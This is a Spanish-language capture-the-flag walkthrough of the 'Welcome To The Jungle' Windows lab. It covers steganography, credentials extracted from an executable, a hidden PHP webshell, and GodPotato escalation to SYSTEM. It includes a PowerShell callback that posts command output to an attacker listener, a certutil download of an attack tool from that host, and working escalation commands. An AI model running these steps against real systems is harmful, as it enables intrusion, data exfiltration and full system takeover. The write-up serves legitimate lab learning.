---
tags: [ctf, thehackerslabs, windows, walkthrough, iis, php, godpotato]
tipo: walkthrough
estado: resuelto
---

# Welcome To The Jungle — Walkthrough

> [!note] **comando → salida relevante → interpretación → por qué**. Pasos del roadmap de Welcome To The Jungle.

## Paso 1 — Reconocimiento de puertos y OS

**Comando**
```bash
nmap -sV -sC -p- 192.168.56.106 -oN nmap_full.nmap
```

**Salida relevante**
```text
80/tcp      open  http    Microsoft IIS httpd 10.0
445/tcp     open  microsoft-ds
5985/tcp    open  http    Microsoft HTTPAPI httpd 2.0
47001/tcp   open  http    Microsoft HTTPAPI httpd 2.0
OS details: Microsoft Windows Server 2022
```

**Interpretación / por qué**
- IIS 10.0 + PHP 8.4.10 → el vector será web. El 5985 habilita **WinRM** como vía de entrada al sistema.

## Paso 2 — Descarga de la web y esteganografía

**Comando**
```bash
curl -s http://192.168.56.106/media/songs.zip -o songs.zip
unzip songs.zip
stegseek -p thehexguns solo_final.wav
```

**Salida relevante**
```text
Password:sweetjungle2025
URL:theh3xgun5
```

**Interpretación / por qué**
- La banda de la web es *The Hex Guns* → `thehexguns` es la passphrase. La salida revela **dos** cosas: la contraseña y la ruta de la aplicación autenticada.

## Paso 3 — Login en la aplicación

**Comando**
```bash
curl -c c.txt -X POST http://192.168.56.106/theh3xgun5/ \
     -d "username=slash&password=sweetjungle2025"
curl -b c.txt http://192.168.56.106/theh3xgun5/panel.php
```

**Salida relevante**
```html
<a href="commlink.exe" class="link">Descargar</a>
```

**Interpretación / por qué**
- El único contenido útil de la zona autenticada es un ejecutable.

## Paso 4 — Strings de `commlink.exe`

**Comando**
```bash
strings -n 5 commlink.exe | grep -iE "pass|band"
```

**Salida relevante**
```text
Enter your band passphrase:
axl password: SoloMaster2025
GuitarHeroes1987
```

**Interpretación / por qué**
- Se confirma la credencial del usuario de Windows `axl` y la passphrase de la banda.

## Paso 5 — Contraseña expirada (desfase de reloj del sistema)

**Síntoma**
```text
STATUS_PASSWORD_EXPIRED
```

**Qué se probó y falló**
- Desplazar el reloj de la VM vía `biossystemtimeoffset` y `paravirt none` → sin efecto.

**Solución aplicada — consola interactiva de VirtualBox**
```bash
# VRDE activo en 127.0.0.1:5900
VBoxManage controlvm "The Hackers Labs - Welcome To The Jungle" \
  keyboardputscancode <scancodes>        # escribir en el diálogo
VBoxManage controlvm "<VM>" screenshotpng vm.png   # leer el diálogo con OCR
```

**Resultado**
```text
thehexguns\axl:NuevaPass2026!
```

**Interpretación / por qué**
- El reloj del sistema estaba en 2026, por lo que la contraseña de laboratorio (creada en 2025) figuraba expirada. Sin consola local no se puede cambiar una contraseña expirada.

## Paso 6 — USER flag

**Comando**
```bash
evil-winrm -i 192.168.56.106 -u axl -p 'NuevaPass2026!'
type C:\Users\Axl\Desktop\user.txt
```

**Salida relevante**
```text
8f1aecc0263f4ccc3d67ac0bb6f218a9
```

## Paso 7 — El webshell de `panel.php`

**Comando**
```bash
curl -s http://192.168.56.106/theh3xgun5/panel.php | head -8
```

**Salida relevante**
```php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . " 2>&1");
}
```

**Interpretación / por qué**
- `shell_exec` **ejecuta** pero la variable `$output` **nunca se imprime** → el resultado no aparece en la respuesta. Hace falta exfiltrarlo por otro canal.

## Paso 8 — Exfiltración de la salida (callback al atacante)

**Comando (ejecutado en el objetivo)**
```powershell
$cmd = 'cmd /c whoami'
$o   = cmd /c $cmd 2>&1 | Out-String
$b   = [Text.Encoding]::UTF8.GetBytes($o)
Invoke-WebRequest -UseBasicParsing -Method POST -Uri 'http://192.168.56.1:8000/out' -Body $b
```

**Salida relevante (recibida en el listener)**
```text
iis apppool\defaultapppool
```

**Interpretación / por qué**
- Identidad de bajo privilegio **pero con permisos de enumeración distintos** a un usuario de escritorio: como app pool se pudieron listar 159 tareas y 69 servicios que a `axl` le eran denegados.

## Paso 9 — Enumeración: el uploader de `HexGuns` NO tiene trigger

**Comando**
```powershell
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' }
schtasks /query /fo LIST /v
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notmatch '^"?C:\\Windows' }
Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty 'HKLM:\...\Winlogon' | Select Shell,Userinit
Get-ItemProperty 'HKLM:\...\Session Manager' -Name BootExecute
```

**Salida relevante**
```text
schtasks: 159 tareas, TODAS bajo \Microsoft\Windows\   → 0 tareas propias
servicios: ninguno con ruta fuera de C:\Windows
WMI:       solo el "SCM Event Log Filter" por defecto
Run:       solo SecurityHealth y VBoxTray
BootExecute: autocheck autochk /q /v *
```

**Comprobación decisive**
```powershell
Get-Item 'C:\Program Files\HexGuns\uploader.log' | fl LastWriteTime
# LastWriteTime : 7/27/2025 7:19:57 PM      ← NO cambia tras reiniciar la VM
```

**Interpretación / por qué**
- `C:\Program Files\HexGuns\setlist_uploader.exe` carga `config.dll` y la carpeta es escribible por `BUILTIN\Usuarios` → **hijack de DLL**, aparentemente clásico. Pero **nadie lo ejecuta**: el log no se toca desde julio de 2025 (ni tras el reinicio) y su formato en inglés no coincide con los strings del exe (`No se pudo cargar config.dll`, en español). **Es un señuelo.**

## Paso 10 — Escalada a SYSTEM con GodPotato

**Comando — subir la herramienta**
```powershell
certutil -urlcache -split -f http://192.168.56.1:8000/GodPotato.exe C:\Users\Public\gp.exe
```

**Comando — verificar privilegios del token**
```powershell
whoami /priv
# SeImpersonatePrivilege          Habilitada
# SeAssignPrimaryTokenPrivilege   Habilitada
# SeCreateGlobalPrivilege         Habilitada
sc query Spooler   # → RUNNING
```

**Comando — ejecutar el Potato**
```powershell
$cmd = 'cmd.exe /c whoami > C:\Users\Public\out.txt'
Start-Process C:\Users\Public\gp.exe -ArgumentList "-cmd","`"$cmd`"" -WindowStyle Hidden -Wait
```

**Salida relevante**
```text
nt authority\system
```

**Interpretación / por qué**
- Con `SeImpersonatePrivilege`, `GodPotato` enruta una llamada RPC a un servicio que corre como SYSTEM y **suplanta su token**. `PrintSpoofer` se probó antes y **colgó** sin producir salida; `GodPotato` funcionó de inmediato (ojo: exige el flag `-cmd`).

## Paso 11 — ROOT flag

**Comando**
```powershell
$cmd = 'cmd.exe /c type "C:\Users\Administrador\Desktop\root.txt" > C:\Users\Public\root_out.txt 2>&1'
Start-Process C:\Users\Public\gp.exe -ArgumentList "-cmd","`"$cmd`"" -WindowStyle Hidden -Wait
```

**Salida relevante**
```text
ef708b85a127545dec1ea99dcd1ebb17
```

**Verificación (misma ejecución, como SYSTEM)**
```text
nt authority\system
Directorio de C:\Users\Administrador\Desktop
27/07/2025  19:16                32 root.txt
ef708b85a127545dec1ea99dcd1ebb17
```

## Paso 12 — Limpieza de artefactos

**Comando**
```powershell
del /f /q "C:\Program Files\HexGuns\config.dll" "C:\Program Files\HexGuns\out_admdesk.txt" `
          "C:\Program Files\HexGuns\out_admhome.txt" "C:\Program Files\HexGuns\out_loaded.txt" `
          "C:\Program Files\HexGuns\out_whoami.txt" "C:\Program Files\HexGuns\pwn.bat"
del /f /q C:\Users\Public\s_*.ps1 C:\Users\Public\GodPotato.exe C:\Users\Public\PrintSpoofer64.exe
taskkill /F /IM PrintSpoofer64.exe    # procesos colgados que bloqueaban el borrado
```

**Resultado**
```text
C:\Program Files\HexGuns : setlist_uploader.exe, uploader.log   (solo originales)
C:\Users\Axl\Desktop    : Microsoft Edge.lnk, user.txt          (intacto)
```

## Qué funcionó

- Esteganografía con la passphrase deducida del nombre de la banda.
- Buscar el **trigger** antes de construir el exploit (el DLL hijack era un señuelo).
- Reutilizar el token del app pool de IIS para enumerar lo que `axl` no podía ver.
- Familia *Potato* con `SeImpersonatePrivilege`.

## Qué falló (y por qué)

- `PrintSpoofer` → se quedó colgado sin generar salida (además dejó procesos huérfanos bloqueando el borrado del `.exe`).
- `GodPotato` sin `-cmd` → solo imprimía la ayuda.
- `2>nul` en `cmd` vía `evil-winrm` → error de dispositivo (`nul` no es un fichero); usar `2>&1` o redirección de PowerShell.
- Desplazar el reloj de la VM → sin efecto sobre la caducidad de la contraseña.

## Qué aprendí

- Un **webshell PHP** puede estar oculto a simple vista en un panel "normal".
- `IIS AppPool\DefaultAppPool` tiene `SeImpersonatePrivilege` + `SeAssignPrimaryTokenPrivilege`: ruta directa a SYSTEM.
- La **diferencia de formato** entre un log y los strings de su supuesto generador es una señal fuerte de señuelo.
- `schtasks /query` desde un usuario no privilegiado no es concluyente: hay que repetir la enumeración con un token más privilegiado.
